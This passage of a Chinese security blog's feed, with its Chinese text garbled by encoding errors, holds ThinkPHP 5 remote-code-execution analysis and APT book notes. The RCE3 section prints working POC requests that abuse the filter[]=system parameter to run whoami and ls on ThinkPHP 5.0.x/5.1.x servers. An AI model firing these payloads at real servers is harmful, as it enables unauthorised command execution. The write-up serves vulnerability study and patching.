class="line">DateTimeImmutable               DateTimeImmutable </span><br><span class="line">DateTimeZone                    DateTimeZone </span><br><span class="line">DateInterval                    DateInterval </span><br><span class="line">DatePeriod                      DatePeriod </span><br><span class="line">LibXMLError                     LibXMLError </span><br><span class="line">DOMException                    DOMException </span><br><span class="line">DOMStringList                   DOMStringList </span><br><span class="line">DOMNameList                     DOMNameList </span><br><span class="line">DOMImplementationList           DOMImplementationList </span><br><span class="line">DOMImplementationSource         DOMImplementationSource </span><br><span class="line">DOMImplementation               DOMImplementation </span><br><span class="line">DOMNode                         DOMNode </span><br><span class="line">DOMNameSpaceNode                DOMNameSpaceNode </span><br><span class="line">DOMDocumentFragment             DOMDocumentFragment </span><br><span class="line">DOMDocument                     DOMDocument </span><br><span class="line">DOMNodeList                     DOMNodeList </span><br><span class="line">DOMNamedNodeMap                 DOMNamedNodeMap </span><br><span class="line">DOMCharacterData                DOMCharacterData </span><br><span class="line">DOMAttr                         DOMAttr </span><br><span class="line">DOMElement                      DOMElement </span><br><span class="line">DOMText                         DOMText </span><br><span class="line">DOMComment                      DOMComment </span><br><span class="line">DOMTypeinfo                     DOMTypeinfo </span><br><span class="line">DOMUserDataHandler              DOMUserDataHandler </span><br><span class="line">DOMDomError                     DOMDomError </span><br><span class="line">DOMErrorHandler                 DOMErrorHandler </span><br><span class="line">DOMLocator                      DOMLocator </span><br><span class="line">DOMConfiguration                DOMConfiguration </span><br><span class="line">DOMCdataSection                 DOMCdataSection </span><br><span class="line">DOMDocumentType                 DOMDocumentType </span><br><span class="line">DOMNotation                     DOMNotation </span><br><span class="line">DOMEntity                       DOMEntity </span><br><span class="line">DOMEntityReference              DOMEntityReference </span><br><span class="line">DOMProcessingInstruction        DOMProcessingInstruction </span><br><span class="line">DOMStringExtend                 DOMStringExtend </span><br><span class="line">DOMXPath                        DOMXPath </span><br><span class="line">finfo                           finfo </span><br><span class="line">LogicException                  LogicException </span><br><span class="line">BadFunctionCallException        BadFunctionCallException </span><br><span class="line">BadMethodCallException          BadMethodCallException </span><br><span class="line">DomainException                 DomainException </span><br><span class="line">InvalidArgumentException        InvalidArgumentException </span><br><span class="line">LengthException                 LengthException </span><br><span class="line">OutOfRangeException             OutOfRangeException </span><br><span class="line">RuntimeException                RuntimeException </span><br><span class="line">OutOfBoundsException            OutOfBoundsException </span><br><span class="line">OverflowException               OverflowException </span><br><span class="line">RangeException                  RangeException </span><br><span class="line">UnderflowException              UnderflowException </span><br><span class="line">UnexpectedValueException        UnexpectedValueException </span><br><span class="line">RecursiveIteratorIterator       RecursiveIteratorIterator </span><br><span class="line">IteratorIterator                IteratorIterator </span><br><span class="line">FilterIterator                  FilterIterator </span><br><span class="line">RecursiveFilterIterator         RecursiveFilterIterator </span><br><span class="line">CallbackFilterIterator          CallbackFilterIterator </span><br><span class="line">RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator </span><br><span class="line">ParentIterator                  ParentIterator </span><br><span class="line">LimitIterator                   LimitIterator </span><br><span class="line">CachingIterator                 CachingIterator </span><br><span class="line">RecursiveCachingIterator        RecursiveCachingIterator </span><br><span class="line">NoRewindIterator                NoRewindIterator </span><br><span class="line">AppendIterator                  AppendIterator </span><br><span class="line">InfiniteIterator                InfiniteIterator </span><br><span class="line">RegexIterator                   RegexIterator </span><br><span class="line">RecursiveRegexIterator          RecursiveRegexIterator </span><br><span class="line">EmptyIterator                   EmptyIterator </span><br><span class="line">RecursiveTreeIterator           RecursiveTreeIterator </span><br><span class="line">ArrayObject                     ArrayObject </span><br><span class="line">ArrayIterator                   ArrayIterator </span><br><span class="line">RecursiveArrayIterator          RecursiveArrayIterator </span><br><span class="line">SplFileInfo                     SplFileInfo </span><br><span class="line">DirectoryIterator               DirectoryIterator </span><br><span class="line">FilesystemIterator              FilesystemIterator </span><br><span class="line">RecursiveDirectoryIterator      RecursiveDirectoryIterator </span><br><span class="line">GlobIterator                    GlobIterator </span><br><span class="line">SplFileObject                   SplFileObject </span><br><span class="line">SplTempFileObject               SplTempFileObject </span><br><span class="line">SplDoublyLinkedList             SplDoublyLinkedList </span><br><span class="line">SplQueue                        SplQueue </span><br><span class="line">SplStack                        SplStack </span><br><span class="line">SplHeap                         SplHeap </span><br><span class="line">SplMinHeap                      SplMinHeap </span><br><span class="line">SplMaxHeap                      SplMaxHeap </span><br><span class="line">SplPriorityQueue                SplPriorityQueue </span><br><span class="line">SplFixedArray                   SplFixedArray </span><br><span class="line">SplObjectStorage                SplObjectStorage </span><br><span class="line">MultipleIterator                MultipleIterator </span><br><span class="line">SessionHandler                  SessionHandler </span><br><span class="line">ReflectionException             ReflectionException </span><br><span class="line">Reflection                      Reflection </span><br><span class="line">ReflectionFunctionAbstract      ReflectionFunctionAbstract </span><br><span class="line">ReflectionFunction              ReflectionFunction </span><br><span class="line">ReflectionParameter             ReflectionParameter </span><br><span class="line">ReflectionMethod                ReflectionMethod </span><br><span class="line">ReflectionClass                 ReflectionClass </span><br><span class="line">ReflectionObject                ReflectionObject </span><br><span class="line">ReflectionProperty              ReflectionProperty </span><br><span class="line">ReflectionExtension             ReflectionExtension </span><br><span class="line">ReflectionZendExtension         ReflectionZendExtension </span><br><span class="line">__PHP_Incomplete_Class          __PHP_Incomplete_Class </span><br><span class="line">php_user_filter                 php_user_filter </span><br><span class="line">Directory                       Directory </span><br><span class="line">SimpleXMLElement                SimpleXMLElement </span><br><span class="line">SimpleXMLIterator               SimpleXMLIterator </span><br><span class="line">SoapClient                      SoapClient </span><br><span class="line">SoapVar                         SoapVar </span><br><span class="line">SoapServer                      SoapServer </span><br><span class="line">SoapFault                       SoapFault </span><br><span class="line">SoapParam                       SoapParam </span><br><span class="line">SoapHeader                      SoapHeader </span><br><span class="line">PharException                   PharException </span><br><span class="line">Phar                            Phar </span><br><span class="line">PharData                        PharData </span><br><span class="line">PharFileInfo                    PharFileInfo </span><br><span class="line">XMLReader                       XMLReader </span><br><span class="line">XMLWriter                       XMLWriter </span><br><span class="line">ZipArchive                      ZipArchive </span><br><span class="line">PDOException                    PDOException </span><br><span class="line">PDO                             PDO </span><br><span class="line">PDOStatement                    PDOStatement </span><br><span class="line">PDORow                          PDORow </span><br><span class="line">CURLFile                        CURLFile </span><br><span class="line">Collator                        Collator </span><br><span class="line">NumberFormatter                 NumberFormatter </span><br><span class="line">Normalizer                      Normalizer </span><br><span class="line">Locale                          Locale </span><br><span class="line">MessageFormatter                MessageFormatter </span><br><span class="line">IntlDateFormatter               IntlDateFormatter </span><br><span class="line">ResourceBundle                  ResourceBundle </span><br><span class="line">Transliterator                  Transliterator </span><br><span class="line">IntlTimeZone                    IntlTimeZone </span><br><span class="line">IntlCalendar                    IntlCalendar </span><br><span class="line">IntlGregorianCalendar           IntlGregorianCalendar </span><br><span class="line">Spoofchecker                    Spoofchecker </span><br><span class="line">IntlException                   IntlException </span><br><span class="line">IntlIterator                    IntlIterator </span><br><span class="line">IntlBreakIterator               IntlBreakIterator </span><br><span class="line">IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator </span><br><span class="line">IntlCodePointBreakIterator      IntlCodePointBreakIterator </span><br><span class="line">IntlPartsIterator               IntlPartsIterator </span><br><span class="line">UConverter                      UConverter </span><br><span class="line">JsonIncrementalParser           JsonIncrementalParser </span><br><span class="line">mysqli_sql_exception            mysqli_sql_exception </span><br><span class="line">mysqli_driver                   mysqli_driver </span><br><span class="line">mysqli                          mysqli </span><br><span class="line">mysqli_warning                  mysqli_warning </span><br><span class="line">mysqli_result                   mysqli_result </span><br><span class="line">mysqli_stmt                     mysqli_stmt </span><br><span class="line">Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c </span><br><span class="line">think\Loader                    think\Loader</span><br><span class="line">think\Error                     think\Error </span><br><span class="line">think\Container                 think\Config </span><br><span class="line">think\App                       think\App </span><br><span class="line">think\Env                       think\Request </span><br><span class="line">think\Config                    think\Hook </span><br><span class="line">think\Hook                      think\Env </span><br><span class="line">think\Facade                    think\Lang </span><br><span class="line">think\facade\Env                think\Log </span><br><span class="line">env                             think\Route</span><br><span class="line">think\Db </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\facade\Route </span><br><span class="line">route </span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule </span><br><span class="line">think\route\RuleGroup </span><br><span class="line">think\route\Domain </span><br><span class="line">think\route\RuleItem </span><br><span class="line">think\route\RuleName </span><br><span class="line">think\route\Dispatch </span><br><span class="line">think\route\dispatch\Url </span><br><span class="line">think\route\dispatch\Module </span><br><span class="line">think\Middleware </span><br><span class="line">think\Cookie </span><br><span class="line">think\View </span><br><span class="line">think\view\driver\Think </span><br><span class="line">think\Template </span><br><span class="line">think\template\driver\File </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File </span><br><span class="line">think\Session </span><br><span class="line">think\Debug </span><br><span class="line">think\Cache </span><br><span class="line">think\cache\Driver </span><br><span class="line">think\cache\driver\File </span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-1"><a href="#åˆ©ç”¨æ€»ç»“-1" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p>by Mochazz:</p><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><blockquote><p>ä»£ç å±‚é¢ï¼šå¢åŠ å¯¹æ§åˆ¶å™¨åçš„åˆæ³•æ€§æ£€æŸ¥ã€‚</p><p>åº”æ€¥å±‚é¢ï¼šä¸´æ—¶å¼€å¯å¼ºåˆ¶è·¯ç”±ã€‚</p></blockquote><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼šå¢åŠ æ­£åˆ™è¡¨è¾¾å¼ <code>^[A-Za-z](\w)*$</code> ï¼Œå¯¹æ§åˆ¶å™¨åè¿›è¡Œåˆæ³•æ€§æ£€æµ‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><h1 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h1><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23ã€5.1.0 &lt;&#x3D; 5.1.16 éœ€è¦å¼€å¯æ¡†æ¶app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 éœ€è¦å­˜åœ¨xxxçš„methodè·¯ç”±ï¼Œä¾‹å¦‚captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls+-al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´æ¦‚è¿°-2"><a href="#æ¼æ´æ¦‚è¿°-2" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>å’Œä¸Šä¸€ä¸ªRCEç›´æ¥åŸå› ä¸€æ ·ï¼Œéƒ½æ˜¯æ²¡æœ‰å¯¹æ§åˆ¶å™¨è¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒã€‚</p><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> åº•å±‚æ²¡æœ‰å¯¹æ§åˆ¶å™¨åè¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´åœ¨æœªå¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="å½±å“ç‰ˆæœ¬-2"><a href="#å½±å“ç‰ˆæœ¬-2" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><h2 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h2 id="åˆ©ç”¨æ€»ç»“-2"><a href="#åˆ©ç”¨æ€»ç»“-2" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><h2 id="æ¼æ´ä¿®å¤-2"><a href="#æ¼æ´ä¿®å¤-2" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸»è¦å‚è€ƒèµ„æ–™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln/&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶G</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="RCE" scheme="https://hack-for.fun/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>CSS æ³¨å…¥å­¦ä¹ ç¬”è®°</title>
    <link href="https://hack-for.fun/5dcc.html"/>
    <id>https://hack-for.fun/5dcc.html</id>
    <published>2020-09-22T12:30:30.000Z</published>
    <updated>2020-09-23T09:36:31.894Z</updated>
    
    
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šé€è§†APTã€‹è¯»ä¹¦ç¬”è®°</title>
    <link href="https://hack-for.fun/0.html"/>
    <id>https://hack-for.fun/0.html</id>
    <published>2020-09-20T16:00:00.000Z</published>
    <updated>2020-09-22T02:51:54.505Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png"></p><h1 id="ã€Šé€è§†APTã€‹"><a href="#ã€Šé€è§†APTã€‹" class="headerlink" title="ã€Šé€è§†APTã€‹"></a>ã€Šé€è§†APTã€‹</h1><h2 id="ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—"><a href="#ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—" class="headerlink" title="ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—"></a>ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—</h2><h3 id="APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€"><a href="#APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€" class="headerlink" title="APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€"></a>APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€</h3><ul><li>ç›®æ ‡ç³»ç»Ÿï¼šå·¥æ§ç³»ç»Ÿ</li><li>æ½œä¼æ¸—é€ï¼šæ„ŸæŸ“äº†ä¼Šæœ—å¢ƒå†…60%çš„PC</li><li>çªç ´ç‰©ç†éš”ç¦»ï¼šUç›˜(ç—…æ¯’æ£€æµ‹åˆ°å®¿ä¸»æœºæ’ä¸ŠUç›˜åˆ™ä¸»åŠ¨å‘Uç›˜æ„ŸæŸ“ç—…æ¯’)</li><li>æŠ€æœ¯æ°´å¹³ï¼šåŒæ—¶åˆ©ç”¨å¤šä¸ª0day(å¾®è½¯å’Œè¥¿é—¨å­å·¥æ§ç³»ç»Ÿ)ï¼Œä½“ç°äº†APTçš„é«˜çº§æ€§</li><li>æ”»å‡»è€…ï¼šææœ‰å¯èƒ½æ˜¯æ•Œå¯¹å…³ç³»çš„æ”¿æ²»åŠ¿åŠ›</li><li>æ”»å‡»æŒç»­æ€§ï¼šC2æœåŠ¡å™¨2005.11å°±å®Œæˆæ³¨å†Œ,å¯èƒ½é•¿è¾¾6~7å¹´</li></ul><h3 id="APTæ”»å‡»çš„æ¦‚å¿µ"><a href="#APTæ”»å‡»çš„æ¦‚å¿µ" class="headerlink" title="APTæ”»å‡»çš„æ¦‚å¿µ"></a>APTæ”»å‡»çš„æ¦‚å¿µ</h3><ul><li><p>èµ·æº</p><ul><li>ç”±ç¾å›½ä¸€åç©ºå†›ä¸Šæ ¡2006å¹´æå‡º</li></ul></li><li><p>ä½•æ—¶å¼•èµ·å…³æ³¨ã€é«˜æ½®</p><ul><li>2010ä¼Šæœ—éœ‡ç½‘ç—…æ¯’ã€2013ç¾å›½â€æ£±é•œé—¨â€äº‹ä»¶</li></ul></li><li><p>å®šä¹‰</p><ul><li><p>çŸ¥åç¬¬ä¸‰æ–¹æœºæ„</p><ul><li><p>ç»´åŸºç™¾ç§‘ã€Mandiantã€èµ›é—¨é“å…‹ã€Damballaã€TechTarget</p><ul><li>1.ç‰¹æ€§ï¼šé«˜çº§ã€æŒç»­ã€å¨èƒã€é’ˆå¯¹ã€‚</li></ul></li></ul></li></ul></li></ul><p>2.ç›®æ ‡åŠ¨æœºï¼šæ”¿æ²»ã€æƒ…æŠ¥ã€æ•°æ®ã€ç»æµåˆ©ç›Š<br>3.APTç›®æ ‡ï¼šå›½é˜²ã€åˆ¶é€ ä¸šã€é‡‘èã€ç§‘ç ”</p><pre><code>- å¥‡å®‰ä¿¡å¨èƒæƒ…æŠ¥ä¸­å¿ƒ    - ä¸æ˜¯ä¸€ä¸ªçº¯ç²¹çš„æŠ€æœ¯æ¦‚å¿µï¼Œæ³›æŒ‡æœ‰ç»„ç»‡ï¼Œæœ‰è®¡åˆ’é’ˆå¯¹ç‰¹å®šç›®æ ‡çš„ä¸€ç³»åˆ—æ”»å‡»    - ç»„ç»‡        - å›½å®¶æˆ–è€…æ”¿åºœ(ç²¾ç¥æ”¯æŒå’Œç‰©è´¨åŸºç¡€)        - æƒ…æŠ¥æœºæ„ã€ç½‘ç»œé—´è°æ´»åŠ¨çš„æ”»å‡»ç»„ç»‡        - ç»æµå®ä½“ã€çŠ¯ç½ªç»„ç»‡ã€ææ€–ä¸»ä¹‰ç»„ç»‡    - èƒ½åŠ›ï¼šæ”»å‡»ä¸è®¡æˆæœ¬(æŠ€æœ¯æˆæœ¬,æ¯”å¦‚ç³»ç»Ÿ0day)    - æŠ€æœ¯ç‰¹ç‚¹ï¼šé’ˆå¯¹æ€§ã€é«˜åº¦éšè—(æ½œä¼æ¸—é€å‘¨æœŸé•¿)ã€ä¸ä»¥ç»æµåˆ©ç›Šä¸ºç›´æ¥ç›®çš„ã€æŒæ¡0day    - é‡å¤§å®‰å…¨äº‹ä»¶ä¸ä¸€å®šæ˜¯APT        - é‡å¤§æŸå¤±çš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2016å¹´ç¾å›½ä¸œéƒ¨äº’è”ç½‘ç˜«ç—ª</code></pre><p>2018å¹´Facebookæ•°æ®æ³„éœ²<br>å›½å†…é…’åº—å¤§é‡ä½æˆ·ä¿¡æ¯æ³„éœ²</p><pre><code>        - å½±å“èŒƒå›´å¤§çš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2017å¹´WannaCryå‹’ç´¢ç—…æ¯’        - é’ˆå¯¹æ€§å¼ºçš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2008å¹´8æœˆä¿„ç½—æ–¯å¯¹æ ¼é²å‰äºšçš„å†›äº‹è¡ŒåŠ¨- APT ä¸å¨èƒæƒ…æŠ¥    - å¨èƒæƒ…æŠ¥ï¼šå®‰å…¨æœºæ„æ‰€æŒæ¡çš„ã€é’ˆå¯¹ç‰¹å®šç»„ç»‡æœºæ„çš„å„ç§ç½‘ç»œå¨èƒä¿¡æ¯ï¼Œè€Œè¯¥ç»„ç»‡æœºæ„è‡ªèº«å¯èƒ½å¹¶ä¸çŸ¥é“ç›¸å…³å¨èƒçš„å­˜åœ¨æˆ–ç»†èŠ‚        - å¨èƒæƒ…æŠ¥çš„ä¸»è¦æ–¹é¢            - æºå¤´ã€ç›®æ ‡ã€åŠ¨æœºã€å·¥å…·ã€æŒ‡æ ‡ã€è¡¨è±¡ã€å½±å“ã€æ–¹æ¡ˆ</code></pre><h3 id="ç›¸å…³ç ”ç©¶"><a href="#ç›¸å…³ç ”ç©¶" class="headerlink" title="ç›¸å…³ç ”ç©¶"></a>ç›¸å…³ç ”ç©¶</h3><ul><li>åœ¨å…¨çƒèŒƒå›´å†…ï¼ŒAPTç ”ç©¶ç¾å›½å’Œä¿„ç½—æ–¯ä¸¤å›½å±ä¸–ç•Œä¸€æµï¼Œä¸­å›½å±å…¨çƒç¬¬äºŒæ¢¯é˜Ÿçš„æ’å¤´å…µ</li><li>è¡Œä¸šé¢†åŸŸï¼šå†›é˜Ÿä¸å›½é˜²ã€æ”¿åºœã€é‡‘èã€å¤–äº¤ã€èƒ½æºã€ç§‘ç ”ã€åŒ»ç–—ã€ä¼ åª’ã€ç”µä¿¡</li><li>ç›®æ ‡åœ°åŸŸï¼šå…¨çƒç»å¤§éƒ¨åˆ†çš„å›½å®¶å’Œåœ°åŒºã€‚éŸ©å›½ã€ä¸­ä¸œã€ç¾å›½ã€ä¿„ç½—æ–¯ã€å·´åŸºæ–¯å¦ç­‰å›½å®¶APTæœ€ä¸ºæ´»è·ƒ</li></ul><h2 id="APTæ”»å‡»çš„å¯¹è±¡"><a href="#APTæ”»å‡»çš„å¯¹è±¡" class="headerlink" title="APTæ”»å‡»çš„å¯¹è±¡"></a>APTæ”»å‡»çš„å¯¹è±¡</h2><h3 id="å·¥æ§ç³»ç»Ÿ"><a href="#å·¥æ§ç³»ç»Ÿ" class="headerlink" title="å·¥æ§ç³»ç»Ÿ"></a>å·¥æ§ç³»ç»Ÿ</h3><ul><li><p>ä¹Œå…‹å…°åœ£è¯å¤§åœç”µäº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šBlackEnergy åé—¨ç¨‹åºã€æ”»å‡»è€…å¯è¿œç¨‹è®¿é—®å¹¶æ“æ§ç”µåŠ›æ§åˆ¶ç³»ç»Ÿ</li></ul></li><li><p>æ²™ç‰¹é˜¿æ‹‰ä¼¯å¤§èµ¦ä¹‹å¤œæ”»å‡»äº‹ä»¶</p><ul><li><p>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šShamoon(Disttrack)ï¼Œèƒ½å¤Ÿå¯¼è‡´ç›®æ ‡ç½‘ç»œå®Œå…¨ç˜«ç—ª(é€šè¿‡å½“å‰çš„æƒé™æ¥è®¿é—®æ´»åŠ¨ç›®å½•ã€ç›¸åŒåŸŸåŠå±€åŸŸç½‘å…¶ä»–ä¸»æœºè¿›è¡Œæ¨ªå‘ç§»åŠ¨)</p><ul><li>æŠ•æ”¾å™¨(Dropper)</li><li>é€šä¿¡ç»„ä»¶(Communications)</li><li>æ“¦é™¤ç»„ä»¶(Wiper)</li></ul></li></ul></li><li><p>ç¾å›½ç”µç½‘æ‰¿åŒ…å•†æ”»å‡»äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šæ¸—é€ç½‘ç«™ï¼Œå‘ç½‘ç«™ä¸Šä¼ æ¶æ„ç¨‹åºï¼Œåˆ©ç”¨æ¶æ„ç¨‹åºè·Ÿè¸ªç½‘ç«™è®¿é—®è€…ï¼Œè·å¾—ç›¸å…³äººå‘˜çš„è´¦å·å¯†ç ï¼Œåˆ©ç”¨è¯¥è´¦å·å‘é€å¤§é‡é’“é±¼é‚®ä»¶</li></ul></li></ul><h3 id="é‡‘èç³»ç»Ÿ"><a href="#é‡‘èç³»ç»Ÿ" class="headerlink" title="é‡‘èç³»ç»Ÿ"></a>é‡‘èç³»ç»Ÿ</h3><ul><li><p>å¤šå›½é“¶è¡Œè¢«ç›—äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼š<br>è·å¾—é“¶è¡ŒSWIFTæƒé™ï¼Œåˆ©ç”¨SWIFIå‘å…¶ä»–é“¶è¡Œå‘é€è½¬è´¦æŒ‡ä»¤ã€ç¯¡æ”¹MT9XXæŠ¥æ–‡æ¸…é™¤è¯æ®</li></ul></li><li><p>ATM æœºç›—çªƒäº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼š</li></ul></li></ul><p>1.é’ˆå¯¹æ€§å…¥ä¾µé‡‘èæœºæ„å‘˜å·¥çš„è®¡ç®—æœºæˆ–é“¶è¡Œç½‘ç»œï¼Œè¿›è¡Œè§†é¢‘ç›‘æ§ï¼ŒæŸ¥çœ‹å’Œè®°å½•è´Ÿè´£è½¬è´¦ç³»ç»Ÿçš„é“¶è¡Œå‘˜å·¥å±å¹•ã€‚è·å–è¶³å¤Ÿçš„ä¿¡æ¯åï¼Œæ¨¡ä»¿é“¶è¡Œå‘˜å·¥çš„è¡Œä¸ºè¿›è¡Œæ¶æ„æ“ä½œã€‚<br>2.æ’å…¥ç‰¹åˆ«åˆ¶é€ çš„èŠ¯ç‰‡(EMV)å¡ï¼Œæ¤å…¥æ¶æ„ç¨‹åºï¼Œåé’çš„åŒæ—¶è®©è®¡ç®—æœºæ–­ç½‘<br>3.å…¥ä¾µå…¶ä»–èµ„äº§ï¼Œé€šè¿‡èµ„äº§å†…ä»£ç†è¿›è¡Œæˆæƒäº¤æ˜“<br>4.å…¥ä¾µå†…éƒ¨ç½‘ç»œã€è·å¾—ATMæ§åˆ¶æƒé™<br>5.é€šè¿‡å…‰é©±ã€USBæ¥å£ç­‰ç›´æ¥å¯¹ATMæœºè¿›è¡Œæ“ä½œ</p><ul><li><p>é»„é‡‘çœ¼(å›½å†…APTç»„ç»‡)è¡ŒåŠ¨äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šä»¥åˆæ³•è½¯ä»¶å¼€å‘å…¬å¸ä¼ªè£…ï¼Œä»¥ä¸å½“ç›ˆåˆ©ä½œä¸ºç›®çš„ï¼Œé•¿æœŸä»äº‹æ•æ„Ÿé‡‘èäº¤æ˜“ä¿¡æ¯çªƒå–æ´»åŠ¨ã€‚ï¼ˆè¯¥ç»„ç»‡æ”»å‡»æ°´å¹³å’Œåä¾¦å¯Ÿèƒ½åŠ›å‡è¾¾åˆ°å›½é™…æ°´å¹³)</li></ul></li></ul><h3 id="åœ°ç¼˜æ”¿æ²»"><a href="#åœ°ç¼˜æ”¿æ²»" class="headerlink" title="åœ°ç¼˜æ”¿æ²»"></a>åœ°ç¼˜æ”¿æ²»</h3><ul><li><p>DNCé‚®ä»¶æ³„éœ²ã€ç¾å›½å¤§é€‰</p><ul><li>å¸Œæ‹‰é‡Œé‚®ä»¶é—¨äº‹ä»¶ï¼Œåˆ©ç”¨ç§äººç”µå­é‚®ä»¶å‘å®¶é‡Œç§äººæœåŠ¡å™¨å‘é€å¤§é‡æ¶‰åŠå›½å®¶æœºå¯†çš„ç»å¯†é‚®ä»¶ï¼Œå¤§çº¦6ä¸‡å°ã€‚</li><li>ç›¸å…³ç»†èŠ‚ï¼šå¸Œæ‹‰é‡Œç«é€‰å›¢é˜Ÿä¸»å¸­è¢«é’“é±¼æ”»å‡»ä¸Šé’©ï¼Œæ³„éœ²é‚®ç®±å¯†ç ï¼Œä»è€Œè·å–é‚®ç®±ä¸­çš„é‚®ä»¶ï¼ŒåŒæ 